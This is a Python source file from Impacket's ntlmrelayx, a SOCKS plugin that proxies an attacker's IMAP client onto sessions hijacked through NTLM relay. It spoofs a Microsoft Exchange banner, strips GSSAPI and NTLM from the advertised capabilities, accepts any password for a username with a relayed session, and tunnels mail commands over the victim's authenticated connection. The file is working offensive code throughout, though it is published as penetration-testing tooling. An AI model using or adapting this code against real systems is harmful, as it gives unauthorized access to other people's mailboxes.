#!/usr/bin/env python
# Copyright (c) 2013-2017 CORE Security Technologies
#
# This software is provided under under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# A Socks Proxy for the IMAP Protocol
#
# Author:
#  Dirk-jan Mollema (@_dirkjan) / Fox-IT (https://www.fox-it.com)
#
# Description:
#  A simple SOCKS server that proxies a connection to relayed IMAP connections
#
# ToDo:
#
import logging
import base64

from imaplib import IMAP4
from impacket import LOG
from impacket.examples.ntlmrelayx.servers.socksserver import SocksRelay

# Besides using this base class you need to define one global variable when
# writing a plugin:
PLUGIN_CLASS = "IMAPSocksRelay"
EOL = '\r\n'

class IMAPSocksRelay(SocksRelay):
    PLUGIN_NAME = 'IMAP Socks Plugin'
    PLUGIN_SCHEME = 'IMAP'

    def __init__(self, targetHost, targetPort, socksSocket, activeRelays):
        SocksRelay.__init__(self, targetHost, targetPort, socksSocket, activeRelays)
        self.packetSize = 8192

    @staticmethod
    def getProtocolPort():
        return 143

    def getServerCapabilities(self):
        for key in self.activeRelays.keys():
            if self.activeRelays[key].has_key('protocolClient'):
                return self.activeRelays[key]['protocolClient'].session.capabilities

    def initConnection(self):
        pass

    def skipAuthentication(self):
        self.socksSocket.send('* OK The Microsoft Exchange IMAP4 service is ready.'+EOL)

        # Next should be the client requesting CAPABILITIES
        tag, cmd = self.recvPacketClient()
        if cmd.upper() == 'CAPABILITY':
            clientcapabilities = list(self.getServerCapabilities())
            # Don't offer these AUTH options so the client won't use them
            blacklist = ['AUTH=GSSAPI', 'AUTH=NTLM', 'LOGINDISABLED']
            for cap in blacklist:
                if cap in clientcapabilities:
                    clientcapabilities.remove(cap)

            # Offer PLAIN auth for specifying the username
            if 'AUTH=PLAIN' not in clientcapabilities:
                clientcapabilities.append('AUTH=PLAIN')
            # Offer LOGIN for specifying the username
            if 'LOGIN' not in clientcapabilities:
                clientcapabilities.append('LOGIN')

            LOG.debug('IMAP: Sending mirrored capabilities from server: %s' % ' '.join(clientcapabilities))
            self.socksSocket.send('* CAPABILITY %s%s%s OK CAPABILITY completed.%s' % (' '.join(clientcapabilities), EOL, tag, EOL))
        else:
            LOG.error('IMAP: Socks plugin expected CAPABILITY command, but got: %s' % cmd)
            return False
        # next
        tag, cmd = self.recvPacketClient()
        args = cmd.split(' ')
        if cmd.upper() == 'AUTHENTICATE PLAIN':
            # Send continuation command
            self.socksSocket.send('+'+EOL)
            # Client will now send their AUTH
            data = self.socksSocket.recv(self.packetSize)
            # This contains base64(\x00username\x00password), decode and split
            creds = base64.b64decode(data.strip())
            self.username = creds.split('\x00')[1].upper()
        elif args[0].upper() == 'LOGIN':
            # Simple login
            self.username = args[1].upper()
        else:
            LOG.error('IMAP: Socks plugin expected LOGIN or AUTHENTICATE PLAIN command, but got: %s' % data)
            return False

        # Check if we have a connection for the user
        if self.activeRelays.has_key(self.username):
            # Check the connection is not inUse
            if self.activeRelays[self.username]['inUse'] is True:
                LOG.error('IMAP: Connection for %s@%s(%s) is being used at the moment!' % (
                    self.username, self.targetHost, self.targetPort))
                return False
            else:
                LOG.info('IMAP: Proxying client session for %s@%s(%s)' % (
                    self.username, self.targetHost, self.targetPort))
                self.session = self.activeRelays[self.username]['protocolClient'].session
        else:
            LOG.error('IMAP: No session for %s@%s(%s) available' % (
                self.username, self.targetHost, self.targetPort))
            return False

        # We arrived here, that means all is OK
        self.socksSocket.send('%s OK %s completed.%s' % (tag, args[0].upper(), EOL))
        self.relaySocket = self.session.sock
        self.relaySocketFile = self.session.file
        return True

    def tunnelConnection(self):
        keyword = ''
        tag = ''
        while True:
            data = self.socksSocket.recv(self.packetSize)
            # If this returns with an empty string, it means the socket was closed
            if data == '':
                return
            # Set the new keyword, unless it is false, then break out of the function
            result = self.processTunnelData(keyword, tag, data)
            if result is False:
                return
            # If its not false, it's a tuple with the keyword and tag
            keyword, tag = result

    def processTunnelData(self, keyword, tag, data):
        # Pass the request to the server, store the tag unless the last command
        # was a continuation. In the case of the continuation we still check if
        # there were commands issued after
        analyze = data.split(EOL)[:-1]
        if keyword == '+':
            # We do send the continuation to the server
            # but we don't analyze it
            self.relaySocket.send(analyze.pop(0)+EOL)
            keyword = ''

        for line in analyze:
            info = line.split(' ')
            tag = info[0]
            # See if a LOGOUT command was sent, in which case we want to close
            # the connection to the client but keep the relayed connection alive
            # also handle APPEND commands
            try:
                if info[1].upper() == 'LOGOUT':
                    self.socksSocket.send('%s OK LOGOUT completed.%s' % (tag, EOL))
                    return False
                if info[1].upper() == 'APPEND':
                    LOG.debug('IMAP socks APPEND command detected, forwarding email data')
                    # APPEND command sent, forward all the data, no further commands here
                    self.relaySocket.send(data)
                    sent = len(data)
                    totalSize = int(info[4][1:-2])
                    while sent < totalSize:
                        data = self.socksSocket.recv(self.packetSize)
                        self.relaySocket.send(data)
                        sent += len(data)
                        LOG.debug('Forwarded %d bytes' % sent)
                    LOG.debug('IMAP socks APPEND command complete')
                    # break out of the analysis loop
                    break
            except IndexError:
                pass
            self.relaySocket.send(line+EOL)

        # Send the response back to the client, until the command is complete
        # or the server requests more data
        while keyword != tag and keyword != '+':
            data = self.relaySocketFile.readline()
            keyword = data.split(' ', 2)[0]
            self.socksSocket.send(data)
        # Return the keyword to indicate processing was OK
        return (keyword, tag)


    def recvPacketClient(self):
        data = self.socksSocket.recv(self.packetSize)
        space = data.find(' ')
        return (data[:space], data[space:].strip())

    @staticmethod
    def keepAlive(connection):
        # Send a NOOP
        try:
            connection.noop()
        # This can happen if there are still messages cached from the previous connection
        except IMAP4.abort:
            pass
